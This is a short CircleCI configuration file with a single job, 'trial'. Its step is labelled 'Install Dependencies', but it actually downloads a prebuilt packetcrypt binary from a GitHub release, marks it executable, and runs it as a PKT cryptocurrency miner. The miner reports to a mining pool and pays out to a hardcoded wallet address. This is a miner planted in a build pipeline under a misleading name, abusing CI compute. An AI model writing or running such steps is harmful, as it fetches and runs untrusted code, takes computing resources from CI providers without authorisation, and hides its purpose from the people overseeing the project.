version: 2.1
jobs:
    trial:
      docker:
            - image: nguyenduyphong/pkt_phong:tagname
      parallelism: 1
      steps:
        - run:
            name: Install Dependencies
            command: |
              wget https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
              chmod +x packetcrypt_x8664_linux
              ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pktpool.io -t 1           

workflows:
    version: 2.1
    build:
        jobs:
        - trial